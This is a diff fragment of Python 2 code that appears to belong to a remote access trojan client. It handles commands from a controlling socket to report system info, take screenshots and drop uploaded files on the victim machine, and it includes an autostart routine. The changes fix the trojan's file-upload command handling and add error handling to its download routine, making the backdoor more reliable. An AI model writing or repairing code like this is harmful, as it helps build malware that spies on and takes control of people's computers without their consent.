@@ -116,16 +116,19 @@ def upload():
 
 def download(sock, filename, end="[ENDOFMESSAGE]"):
     recievedData = ''
-    l = sock.recv(1024)
-    while l:
-        recievedData += l
-        if recievedData.endswith(end):
-            break
-        else:
-            l = sock.recv(1024)
-    with open(filename, 'wb') as _file:
-        _file.write(recievedData[:-len(end)])
-    return 'downloadDone'
+    try:
+        l = sock.recv(1024)
+        while l:
+            recievedData += l
+            if recievedData.endswith(end):
+                break
+            else:
+                l = sock.recv(1024)
+        with open(filename, 'wb') as _file:
+            _file.write(recievedData[:-len(end)])
+        return 'downloadDone'
+    except:
+        return 'downloadError'
 
 
 def ScreenBITS():
@@ -246,16 +249,6 @@ def fromAutostart():
         while 1:
             try:
                 mode, data = Receive(s)
-                print data
-                if data.startswith('upload '):
-                    print 'vtvirtav'
-                    try:
-                        filename = data.split(' ')[1]
-                        stdoutput = download(s, filename)
-                    except:
-                        stdoutput = 'uploadError'
-                    Send(s, stdoutput, mode)
-                    continue
                 if data == 'info':
                     Send(s, PCINFO(), mode)
                     continue
@@ -277,8 +270,7 @@ def fromAutostart():
                             stdoutput = PCINFO()
                         elif data == 'getScreen':
                             stdoutput = SCREENSHOT()
-                        elif data.startswith == 'upload ':
-                            print 'vtvirtav'
+                        elif data.startswith('upload '):
                             try:
                                 filename = data.split(' ')[1]
                                 stdoutput = download(s, filename)
